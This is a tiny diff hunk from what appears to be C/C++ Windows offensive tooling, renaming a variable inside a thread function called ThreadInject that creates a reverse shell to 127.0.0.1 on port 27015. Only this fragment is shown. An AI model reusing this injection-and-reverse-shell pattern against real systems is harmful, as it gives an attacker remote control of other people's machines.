@@ -142,7 +142,7 @@ int main(int argc, const char* argv[]) {
 
 DWORD WINAPI ThreadInject(PVOID64 Param)
 {
-	shell ripafshell((char *)"127.0.0.1", 27015);
+	shell revshell((char *)"127.0.0.1", 27015);
 	return 0;
 }
 
